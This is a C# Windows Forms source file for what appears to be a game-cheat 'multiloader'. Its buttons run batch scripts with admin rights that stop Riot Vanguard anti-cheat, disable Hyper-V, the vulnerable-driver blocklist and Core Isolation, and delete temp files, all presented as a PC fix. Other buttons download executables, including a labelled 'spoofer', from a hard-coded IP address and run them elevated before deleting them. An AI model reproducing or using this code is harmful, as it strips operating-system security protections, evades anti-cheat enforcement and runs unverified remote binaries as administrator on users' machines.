using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace redskyservice_multiloader
{
    public partial class Form1 : Form
    {
        private List<Particle> particles = new List<Particle>();
        private Random random = new Random();
        private System.Windows.Forms.Timer timerParticles = new System.Windows.Forms.Timer();
        private Point previousFormLocation;
        private bool isFirstUpdate = true;

        public Form1()
        {
            InitializeComponent();
            DoubleBuffered = true;
            InitializeParticles();
            timerParticles.Interval = 1;
            timerParticles.Tick += timer1_Tick;
            timerParticles.Start();
            DoubleBuffered = true;
            this.ShowIcon = false;
        }

        private void InitializeParticles()
        {
            int numParticles = 50;
            for (int i = 0; i < numParticles; i++) {
                double angle = random.NextDouble() * 2 * Math.PI;
                double speed = random.Next(1, 3);
                particles.Add(new Particle()
                {
                    Position = new PointF(random.Next(0, ClientSize.Width), random.Next(0, ClientSize.Height)),
                    Velocity = new PointF((float)(Math.Cos(angle) * speed), (float)(Math.Sin(angle) * speed)),
                    Radius = random.Next(2, 5),
                    Color = Color.Red
                });
            }
        }
        private void UpdateParticles()
        {
            foreach (var particle in particles)
            {
                particle.Position = new PointF(particle.Position.X + particle.Velocity.X * 0.5f, particle.Position.Y + particle.Velocity.Y);

                if (particle.Position.X < 0 || particle.Position.X > ClientSize.Height)
                {
                    particle.Velocity = new PointF(-particle.Velocity.X, particle.Velocity.Y);
                    particle.Position = new PointF(particle.Position.X + particle.Velocity.X * 0.5f, particle.Position.Y);
                }
                if (particle.Position.Y < 0 || particle.Position.Y > ClientSize.Height)
                {
                    particle.Velocity = new PointF(particle.Velocity.X, -particle.Velocity.Y);
                    particle.Position = new PointF(particle.Position.X, particle.Position.Y + particle.Velocity.Y * 0.5f);
                }
            }
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            e.Graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;

            foreach (var particle in particles)
            {
                int transparency = (int)((1.0f - (particle.Position.Y / (float)ClientSize.Height)) * 255);
                if (transparency > 225) transparency = 255;
                if (transparency < 0) transparency = 0;

                Color particleColor = Color.FromArgb(transparency, ColorTranslator.FromHtml("#F7F9F2"));

                int reduceRadius = particle.Radius / 2;
                e.Graphics.FillEllipse(new SolidBrush(particleColor),
                    particle.Position.X - reduceRadius,
                    particle.Position.Y - reduceRadius,
                    reduceRadius * 2, reduceRadius * 2
                );
            }

            foreach (var particle in particles)
            {
                foreach (var otherParticle in particles)
                {
                    if (particle != otherParticle)
                    {
                        float dx = particle.Position.X - otherParticle.Position.X;
                        float dy = particle.Position.Y - otherParticle.Position.Y;
                        float distance = (float)Math.Sqrt(dx * dx + dy * dy);

                        if (distance < 50)
                        {
                            int alpha = (int)((1.0f - (distance / 50.0f)) * 255.0f);
                            Color lineColor = Color.FromArgb(alpha, 255, 0, 255);
                            e.Graphics.DrawLine(new Pen(lineColor, 1),
                                particle.Position, otherParticle.Position);
                        }
                    }
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            UpdateParticles();
            Invalidate();
        }

        public class Particle
        {
            public PointF Position { get; set; }
            public PointF Velocity { get; set; }
            public int Radius { get; set; }
            public Color Color { get; set; }
        }

        private void guna2Button7_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            string batContent = @"@echo off
color 0B
echo Thanks for choosing our tool We will fix your PC rq - you're ready?
choice /C YN /M ""Press Y to continue or N to exit.""

if errorlevel 2 (
    echo Exiting script...
    timeout /nobreak /t 2 >nul
    exit
)

@echo off
title System Configuration
color 0A

NET FILE >nul 2>&1
if %errorLevel% == 0 (
    goto :adminCheck
) else (
    echo Please run this script as an administrator.
    pause
    exit
)

:adminCheck
echo Deleting temporary files...
del /q /s %TEMP%\*.*

echo Riot Vanguard will be deactivated.
sc stop vgk
timeout /nobreak /t 2 >nul

echo Disabling Hyper-V...
bcdedit /set hypervisorlaunchtype off
powershell.exe -ExecutionPolicy Bypass -Command ""Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All""

echo Disabling VulnerableDriverBlocklist...
reg add ""HKLM\SOFTWARE\Microsoft\SQMClient\Windows\Vulnerability\Override"" /v ""Windows11_22H2_BlockList"" /t REG_DWORD /d 0 /f

echo Adding regedits...
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v FeatureSettingsOverride /t REG_DWORD /d 3 /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f

echo Disabling Core Isolation...
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""EnableVirtualizationBasedSecurity"" /t REG_DWORD /d 0 /f

pause";

            string tempBatFile = Path.Combine(Path.GetTempPath(), "temp_script.bat");

            try
            {
                File.WriteAllText(tempBatFile, batContent);
                Process process = new Process();
                process.StartInfo.FileName = tempBatFile;
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.Verb = "runas";
                process.Start();
                process.WaitForExit();
                File.Delete(tempBatFile);
                MessageBox.Show("Successfully fixed...", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            string batContent = @"@echo off
color 0B
echo Thanks for choosing our tool We will fix your PC rq - you're ready?
choice /C YN /M ""Press Y to continue or N to exit.""

if errorlevel 2 (
    echo Exiting script...
    timeout /nobreak /t 2 >nul
    exit
)

@echo off
title System Configuration
color 0A

NET FILE >nul 2>&1
if %errorLevel% == 0 (
    goto :adminCheck
) else (
    echo Please run this script as an administrator.
    pause
    exit
)

:adminCheck
echo Deleting temporary files...
del /q /s %TEMP%\*.*

echo Riot Vanguard will be deactivated.
sc stop vgk
timeout /nobreak /t 2 >nul

echo Disabling Hyper-V...
bcdedit /set hypervisorlaunchtype off
powershell.exe -ExecutionPolicy Bypass -Command ""Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All""

echo Disabling VulnerableDriverBlocklist...
reg add ""HKLM\SOFTWARE\Microsoft\SQMClient\Windows\Vulnerability\Override"" /v ""Windows11_22H2_BlockList"" /t REG_DWORD /d 0 /f

echo Adding regedits...
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v FeatureSettingsOverride /t REG_DWORD /d 3 /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f

echo Disabling Core Isolation...
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""EnableVirtualizationBasedSecurity"" /t REG_DWORD /d 0 /f

pause";

            string tempBatFile = Path.Combine(Path.GetTempPath(), "temp_script.bat");

            try
            {
                File.WriteAllText(tempBatFile, batContent);
                Process process = new Process();
                process.StartInfo.FileName = tempBatFile;
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.Verb = "runas";
                process.Start();
                process.WaitForExit();
                File.Delete(tempBatFile);
                MessageBox.Show("Successfully fixed...", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button5_Click(object sender, EventArgs e)
        {
            string batContent = @"@echo off
color 0B
echo Thanks for choosing our tool We will fix your PC rq - you're ready?
choice /C YN /M ""Press Y to continue or N to exit.""

if errorlevel 2 (
    echo Exiting script...
    timeout /nobreak /t 2 >nul
    exit
)

@echo off
title System Configuration
color 0A

NET FILE >nul 2>&1
if %errorLevel% == 0 (
    goto :adminCheck
) else (
    echo Please run this script as an administrator.
    pause
    exit
)

:adminCheck
echo Deleting temporary files...
del /q /s %TEMP%\*.*

echo Riot Vanguard will be deactivated.
sc stop vgk
timeout /nobreak /t 2 >nul

echo Disabling Hyper-V...
bcdedit /set hypervisorlaunchtype off
powershell.exe -ExecutionPolicy Bypass -Command ""Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All""

echo Disabling VulnerableDriverBlocklist...
reg add ""HKLM\SOFTWARE\Microsoft\SQMClient\Windows\Vulnerability\Override"" /v ""Windows11_22H2_BlockList"" /t REG_DWORD /d 0 /f

echo Adding regedits...
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v FeatureSettingsOverride /t REG_DWORD /d 3 /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f

echo Disabling Core Isolation...
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""EnableVirtualizationBasedSecurity"" /t REG_DWORD /d 0 /f

pause";

            string tempBatFile = Path.Combine(Path.GetTempPath(), "temp_script.bat");

            try
            {
                File.WriteAllText(tempBatFile, batContent);
                Process process = new Process();
                process.StartInfo.FileName = tempBatFile;
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.Verb = "runas";
                process.Start();
                process.WaitForExit();
                File.Delete(tempBatFile);
                MessageBox.Show("Successfully fixed...", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void guna2Button2_Click(object sender, EventArgs e)
        {
            string exeUrl = "http://77.90.24.88:5000/download_loader2";
            string tempFolder = Path.Combine(Path.GetTempPath(), "redskyservicehub02");
            string exePath = Path.Combine(tempFolder, "Loader.exe");

            try
            {
                // Kill any existing processes that might lock the file
                foreach (var proc in Process.GetProcessesByName("Loader"))
                {
                    try { proc.Kill(); } catch { }
                }

                // Ensure clean state
                if (File.Exists(exePath))
                {
                    try { File.Delete(exePath); } catch { }
                }
                if (Directory.Exists(tempFolder))
                {
                    try { Directory.Delete(tempFolder, true); } catch { }
                }

                // Create fresh directory
                Directory.CreateDirectory(tempFolder);

                // Download file with retry mechanism
                int maxRetries = 3;
                int currentRetry = 0;

                while (currentRetry < maxRetries)
                {
                    try
                    {
                        using (var client = new WebClient())
                        {
                            client.DownloadFile(new Uri(exeUrl), exePath);
                        }
                        break; // If successful, exit the loop
                    }
                    catch (WebException webEx)
                    {
                        currentRetry++;
                        if (currentRetry >= maxRetries)
                        {
                            throw new Exception($"Download failed after {maxRetries} attempts: {webEx.Message}");
                        }
                        await Task.Delay(1000); // Wait for 1 second before retrying
                    }
                }


                // Verify download
                if (!File.Exists(exePath))
                {
                    throw new FileNotFoundException("The file could not be downloaded.");
                }

                // Execute with elevated privileges
                var startInfo = new ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = true,
                    Verb = "runas"
                };

                using (var process = Process.Start(startInfo))
                {
                    if (process != null)
                    {
                        process.WaitForExit();
                    }
                }

                // Wait before cleanup
                await Task.Delay(2000);

                // Cleanup
                try
                {
                    if (File.Exists(exePath))
                    {
                        File.Delete(exePath);
                    }
                    if (Directory.Exists(tempFolder))
                    {
                        Directory.Delete(tempFolder, true);
                    }
                }
                catch (Exception ex)
                {
                    // Log cleanup error but don't show to user
                    Console.WriteLine($"Cleanup error: {ex.Message}");
                }

                MessageBox.Show("Loader executed successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (WebException webEx)
            {
                MessageBox.Show($"Network error: {webEx.Message}\n\nPlease check your internet connection and try again.",
                    "Connection Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (UnauthorizedAccessException)
            {
                MessageBox.Show("Access denied. Please run the program as administrator.",
                    "Access Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}",
                    "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void guna2Button3_Click(object sender, EventArgs e)
        {
            string exeUrl = "http://77.90.24.88:5000/download_loader3"; // Replace with actual URL
            string tempFolder = Path.Combine(Path.GetTempPath(), "redskyservicehub03");
            string exePath = Path.Combine(tempFolder, "Loader.exe");

            {
                try
                {
                    // Ensure clean state
                    if (File.Exists(exePath))
                    {
                        try { File.Delete(exePath); } catch { }
                    }
                    if (Directory.Exists(tempFolder))
                    {
                        try { Directory.Delete(tempFolder, true); } catch { }
                    }

                    // Create fresh directory
                    Directory.CreateDirectory(tempFolder);

                    // Download file
                    using (var client = new WebClient())
                    {
                        await client.DownloadFileTaskAsync(new Uri(exeUrl), exePath);
                    }

                    // Verify download
                    if (!File.Exists(exePath))
                    {
                        throw new FileNotFoundException("The file could not be downloaded.");
                    }

                    // Execute with elevated privileges
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = exePath,
                        UseShellExecute = true,
                        Verb = "runas"
                    };

                    using (var process = Process.Start(startInfo))
                    {
                        if (process != null)
                        {
                            process.WaitForExit();
                        }
                    }

                    // Wait before cleanup
                    await Task.Delay(2000);

                    // Cleanup
                    try
                    {
                        if (File.Exists(exePath))
                        {
                            File.Delete(exePath);
                        }
                        if (Directory.Exists(tempFolder))
                        {
                            Directory.Delete(tempFolder, true);
                        }
                    }
                    catch (Exception ex)
                    {
                        // Log cleanup error but don't show to user
                        Console.WriteLine($"Cleanup error: {ex.Message}");
                    }

                    MessageBox.Show("Loader executed successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (UnauthorizedAccessException)
                {
                    MessageBox.Show("Access denied. Please run the program as administrator.",
                        "Access Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"An error occurred: {ex.Message}",
                        "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                }
            }
        }

        private async void guna2Button6_Click(object sender, EventArgs e)
        {
            string exeUrl = "http://77.90.24.88:5000/download_loader4";
            string tempFolder = Path.Combine(Path.GetTempPath(), "redskyservicehub04");
            string exePath = Path.Combine(tempFolder, "Loader.exe");

            {
                try
                {
                    // Ensure clean state
                    if (File.Exists(exePath))
                    {
                        try { File.Delete(exePath); } catch { }
                    }
                    if (Directory.Exists(tempFolder))
                    {
                        try { Directory.Delete(tempFolder, true); } catch { }
                    }

                    // Create fresh directory
                    Directory.CreateDirectory(tempFolder);

                    // Download file
                    using (var client = new WebClient())
                    {
                        await client.DownloadFileTaskAsync(new Uri(exeUrl), exePath);
                    }

                    // Verify download
                    if (!File.Exists(exePath))
                    {
                        throw new FileNotFoundException("The file could not be downloaded.");
                    }

                    // Execute with elevated privileges
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = exePath,
                        UseShellExecute = true,
                        Verb = "runas"
                    };

                    using (var process = Process.Start(startInfo))
                    {
                        if (process != null)
                        {
                            process.WaitForExit();
                        }
                    }

                    // Wait before cleanup
                    await Task.Delay(2000);

                    // Cleanup
                    try
                    {
                        if (File.Exists(exePath))
                        {
                            File.Delete(exePath);
                        }
                        if (Directory.Exists(tempFolder))
                        {
                            Directory.Delete(tempFolder, true);
                        }
                    }
                    catch (Exception ex)
                    {
                        // Log cleanup error but don't show to user
                        Console.WriteLine($"Cleanup error: {ex.Message}");
                    }

                    MessageBox.Show("Loader executed successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (UnauthorizedAccessException)
                {
                    MessageBox.Show("Access denied. Please run the program as administrator.",
                        "Access Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"An error occurred: {ex.Message}",
                        "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                }
            }
        }

        //SPOOOFER
        private async void guna2Button8_Click(object sender, EventArgs e)
        {
            string exeUrl = "http://77.90.24.88:5000/download_loader1";
            string tempFolder = Path.Combine(Path.GetTempPath(), "redskyservicehub01");
            string exePath = Path.Combine(tempFolder, "redskyservice_privat_spoofer.exe");

            using (var cts = new CancellationTokenSource())
            {
                try
                {
                    foreach (var proc in Process.GetProcessesByName("redskyservice_privat_spoofer"))
                    {
                        try { proc.Kill(); } catch { }
                    }
                    if (File.Exists(exePath))
                    {
                        try { File.Delete(exePath); } catch { }
                    }
                    if (Directory.Exists(tempFolder))
                    {
                        try { Directory.Delete(tempFolder, true); } catch { }
                    }

                    Directory.CreateDirectory(tempFolder);
                    using (var client = new WebClient())
                    {
                        await client.DownloadFileTaskAsync(new Uri(exeUrl), exePath);
                    }
                    if (!File.Exists(exePath))
                    {
                        throw new FileNotFoundException("The file could not be downloaded.");
                    }
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = exePath,
                        UseShellExecute = true,
                        Verb = "runas"
                    };

                    using (var process = Process.Start(startInfo))
                    {
                        if (process != null)
                        {
                            process.WaitForExit();
                        }
                    }

                    await Task.Delay(2000);

                    try
                    {
                        if (File.Exists(exePath))
                        {
                            File.Delete(exePath);
                        }
                        if (Directory.Exists(tempFolder))
                        {
                            Directory.Delete(tempFolder, true);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Cleanup error: {ex.Message}");
                    }

                    MessageBox.Show("Loader executed successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (UnauthorizedAccessException)
                {
                    MessageBox.Show("Access denied. Please run the program as administrator.",
                        "Access Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"An error occurred: {ex.Message}",
                        "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                }
            }
        }

        private void guna2Panel6_Paint(object sender, PaintEventArgs e)
        {

        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {

        }

        private void guna2Panel5_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2VSeparator2_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button10_Click(object sender, EventArgs e)
        {
            string batContent = @"



@echo off
color 0c
title REDSKYSERVICE V3 - Chair Loader Fix Tool
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [REDSKYSERVICE V3 - Chair Loader Fix Tool]
    echo =========================================
    echo.
    echo Requesting administrator privileges...
    powershell -Command ""Start-Process -Verb RunAs -FilePath '%0'"" > nul 2>&1
    exit /b
)
cls
echo [REDSKYSERVICE V3 - Chair Loader Fix Tool]
echo =========================================
echo.
echo Attempting to fix the chair loader...
sc stop windowsproc > nul 2>&1
if %errorLevel% == 0 (
    echo Success: Chair loader has been fixed.
) else (
    echo Error: Failed to stop windowsproc service.
    echo Please contact REDSKYSERVICE V3 support for assistance.
)
echo.
echo Press any key to exit...
pause > nul





";

            string tempBatFile = Path.Combine(Path.GetTempPath(), "temp_script2.bat");

            try
            {
                File.WriteAllText(tempBatFile, batContent);
                Process process = new Process();
                process.StartInfo.FileName = tempBatFile;
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.Verb = "runas";
                process.Start();
                process.WaitForExit();
                File.Delete(tempBatFile);
                MessageBox.Show("Successfully fixed...", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button9_Click(object sender, EventArgs e)
        {
            string batContent = @"



@echo off
color 0c
title REDSKYSERVICE V3 - Chair Loader Fix Tool
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [REDSKYSERVICE V3 - Chair Loader Fix Tool]
    echo =========================================
    echo.
    echo Requesting administrator privileges...
    powershell -Command ""Start-Process -Verb RunAs -FilePath '%0'"" > nul 2>&1
    exit /b
)
cls
echo [REDSKYSERVICE V3 - Chair Loader Fix Tool]
echo =========================================
echo.
echo Attempting to fix the chair loader...
sc stop windowsproc > nul 2>&1
if %errorLevel% == 0 (
    echo Success: Chair loader has been fixed.
) else (
    echo Error: Failed to stop windowsproc service.
    echo Please contact REDSKYSERVICE V3 support for assistance.
)
echo.
echo Press any key to exit...
pause > nul





";

            string tempBatFile = Path.Combine(Path.GetTempPath(), "temp_script2.bat");

            try
            {
                File.WriteAllText(tempBatFile, batContent);
                Process process = new Process();
                process.StartInfo.FileName = tempBatFile;
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.Verb = "runas";
                process.Start();
                process.WaitForExit();
                File.Delete(tempBatFile);
                MessageBox.Show("Successfully fixed...", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button11_Click(object sender, EventArgs e)
        {
            string batContent = @"



@echo off
color 0c
title REDSKYSERVICE V3 - Chair Loader Fix Tool
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [REDSKYSERVICE V3 - Chair Loader Fix Tool]
    echo =========================================
    echo.
    echo Requesting administrator privileges...
    powershell -Command ""Start-Process -Verb RunAs -FilePath '%0'"" > nul 2>&1
    exit /b
)
cls
echo [REDSKYSERVICE V3 - Chair Loader Fix Tool]
echo =========================================
echo.
echo Attempting to fix the chair loader...
sc stop windowsproc > nul 2>&1
if %errorLevel% == 0 (
    echo Success: Chair loader has been fixed.
) else (
    echo Error: Failed to stop windowsproc service.
    echo Please contact REDSKYSERVICE V3 support for assistance.
)
echo.
echo Press any key to exit...
pause > nul





";

            string tempBatFile = Path.Combine(Path.GetTempPath(), "temp_script2.bat");

            try
            {
                File.WriteAllText(tempBatFile, batContent);
                Process process = new Process();
                process.StartInfo.FileName = tempBatFile;
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.Verb = "runas";
                process.Start();
                process.WaitForExit();
                File.Delete(tempBatFile);
                MessageBox.Show("Successfully fixed...", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
